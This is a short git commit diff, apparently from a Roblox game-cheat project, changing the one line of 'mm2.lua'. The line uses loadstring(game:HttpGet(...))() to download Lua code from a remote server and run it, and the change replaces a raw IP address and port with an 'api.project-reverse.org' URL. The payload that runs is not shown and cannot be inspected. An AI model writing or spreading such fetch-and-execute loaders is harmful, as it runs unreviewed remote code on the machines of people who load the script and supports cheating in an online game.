5273455b3634942d2a13a7e9404d29b57ca2e832
proplayer123-z <idkfrcap@gmail.com>
2026-08-14 12:19:42 +0800

    Update mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjdlOGQ5MWM3LTYwMmMtNDVjNy05YzFkLTQ5YjhiZDJjYzgyNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjdlOGQ5MWM3LTYwMmMtNDVjNy05YzFkLTQ5YjhiZDJjYzgyNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmUifX0"))()
